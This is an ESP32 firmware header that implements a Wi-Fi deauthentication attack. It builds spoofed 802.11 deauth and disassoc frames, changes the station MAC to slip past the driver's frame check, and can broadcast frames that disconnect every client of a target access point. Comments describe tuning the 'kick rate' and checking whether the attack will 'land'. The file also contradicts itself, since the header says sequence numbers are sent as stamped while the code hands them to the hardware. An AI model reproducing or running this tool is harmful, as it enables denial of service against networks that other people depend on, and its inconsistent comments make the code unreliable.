/*
 * wifi_deauth_frame — shared 802.11 deauth/disassoc frame builder.
 *
 * Addressing follows the 802.11-2016 mgmt frame layout:
 *   addr1 = destination (either broadcast FF:FF:...FF or the client STA MAC)
 *   addr2 = transmitter / BSSID being impersonated
 *   addr3 = BSSID
 *
 * Every invocation fires a deauth (subtype 0xC0, reason 7) *and* a disassoc
 * (subtype 0xA0, reason 8). This mirrors aircrack-ng `--deauth`, ESP32
 * Marauder, and Ghost ESP — some client drivers ignore deauth but honor
 * disassoc, and vice versa. Sending the pair improves kick rate against a
 * wider range of targets.
 *
 * The sequence number is caller-owned and incremented per frame. A static
 * zero sequence number causes some APs and modern client drivers to treat
 * every frame as a duplicate of the previous one — they rate-limit or drop.
 *
 * esp_wifi_80211_tx is called with en_sys_seq=false so the sequence we
 * stamp is the one that goes on air. If a patched WiFi blob is present
 * (see docs/deauth-injection-patch.md) the frames leave the chip as
 * written. On stock IDF some frames may be dropped at the TX FIFO —
 * return value tracks actual sends.
 *
 * Returns: number of frames the driver accepted (0, 1, or 2).
 */
#pragma once

#include <Arduino.h>
#include <esp_wifi.h>
#include <string.h>

/*
 * Spoof the STA interface MAC so esp_wifi_80211_tx passes the stock
 * ESP-IDF blob's ieee80211_raw_frame_sanity_check. That check rejects
 * any frame whose addr2 doesn't match the interface's MAC — our deauth
 * frames spoof the AP's BSSID as addr2 (correct per 802.11), so every
 * frame gets silently dropped at the driver layer unless we spoof the
 * STA's MAC to match the BSSID we're impersonating.
 *
 * set_mac must be called while WiFi is STOPPED, not merely initialized,
 * so we stop-set-start around it. Returns ESP_OK on success.
 */
static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
{
    esp_wifi_stop();
    esp_err_t rc = esp_wifi_set_mac(WIFI_IF_STA, mac);
    esp_wifi_start();
    /* WiFi needs a few hundred ms to fully bring STA back up after
     * start. TX requests before that return ESP_ERR_WIFI_IF silently. */
    delay(250);
    return rc;
}

static inline void wifi_save_sta_mac(uint8_t out[6])
{
    esp_wifi_get_mac(WIFI_IF_STA, out);
}

static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
{
    uint16_t s = seq & 0x0FFF;
    /* Seq Control = (SeqNum << 4) | FragNum, little-endian */
    f[22] = (uint8_t)((s & 0x000F) << 4);
    f[23] = (uint8_t)((s >> 4) & 0xFF);
}

/*
 * Fire one deauth + one disassoc at `dst` spoofed from `bssid`.
 * `seq` is a caller-owned counter, incremented twice (once per frame).
 */
static inline int wifi_deauth_pair(const uint8_t dst[6],
                                   const uint8_t bssid[6],
                                   uint16_t *seq)
{
    uint8_t f[26];
    /* Frame Control */
    f[0] = 0xC0;  /* type=mgmt, subtype=deauth */
    f[1] = 0x00;
    /* Duration */
    f[2] = 0x3A; /* 58us — borrowed from aircrack-ng default */
    f[3] = 0x01;
    /* Addresses */
    memcpy(f + 4,  dst,   6);
    memcpy(f + 10, bssid, 6);
    memcpy(f + 16, bssid, 6);
    /* Sequence */
    _deauth_stamp_seq(f, (*seq)++);
    /* Reason code 7: class 3 frame received from nonassociated STA */
    f[24] = 0x07;
    f[25] = 0x00;

    int ok = 0;
    /* en_sys_seq=true lets the hardware manage the sequence number and
     * also tends to bypass the blob's stricter sanity check on pre-
     * stamped frames. Our seq bytes get overwritten by the hardware. */
    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
    if (rc == ESP_OK) ok++;
    else {
        static uint32_t _last_tx_err_log = 0;
        if (millis() - _last_tx_err_log > 1000) {
            uint8_t actual_mac[6];
            esp_wifi_get_mac(WIFI_IF_STA, actual_mac);
            Serial.printf("[80211_tx] deauth rc=%d (0x%x) sta_mac=%02X:%02X:%02X:%02X:%02X:%02X addr2=%02X:%02X:%02X:%02X:%02X:%02X\n",
                          (int)rc, (unsigned)rc,
                          actual_mac[0], actual_mac[1], actual_mac[2],
                          actual_mac[3], actual_mac[4], actual_mac[5],
                          f[10], f[11], f[12], f[13], f[14], f[15]);
            _last_tx_err_log = millis();
        }
    }

    /* Same frame, different subtype + reason = disassoc pair. */
    f[0] = 0xA0;  /* subtype=disassoc */
    _deauth_stamp_seq(f, (*seq)++);
    f[24] = 0x08;  /* reason 8: disassociated due to inactivity */
    f[25] = 0x00;

    rc = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), true);
    if (rc == ESP_OK) ok++;
    return ok;
}

/*
 * One broadcast pair targeting every STA associated to `bssid`.
 */
static inline int wifi_deauth_broadcast(const uint8_t bssid[6], uint16_t *seq)
{
    static const uint8_t BCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return wifi_deauth_pair(BCAST, bssid, seq);
}

/*
 * PMF/WPA3 hint. Returns true if the auth mode is known to use Protected
 * Management Frames — in which case plain deauth/disassoc is
 * cryptographically dropped and this attack won't land.
 *
 * `auth` comes from ap_t.auth which is `(uint8_t)WiFi.encryptionType(i)`.
 * The numeric values are stable across IDF versions: WPA3_PSK=6,
 * WPA2_WPA3_PSK=7, ENTERPRISE(WPA2-Ent)=5, WPA3_ENT_192=10.
 */
static inline bool wifi_auth_has_pmf(uint8_t auth)
{
    /* PMF-mandatory or PMF-capable auth modes. Numeric values match
     * wifi_auth_mode_t across IDF 4.x / 5.x. */
    switch (auth) {
        case 5:   /* WIFI_AUTH_ENTERPRISE (WPA2-Enterprise) */
        case 6:   /* WIFI_AUTH_WPA3_PSK */
        case 7:   /* WIFI_AUTH_WPA2_WPA3_PSK — WPA3-transition, PMF required */
        case 10:  /* WIFI_AUTH_WPA3_ENT_192 */
        case 11:  /* WIFI_AUTH_WPA3_EXT_PSK */
        case 12:  /* WIFI_AUTH_WPA3_EXT_PSK_MIXED_MODE */
            return true;
        default:
            return false;
    }
}
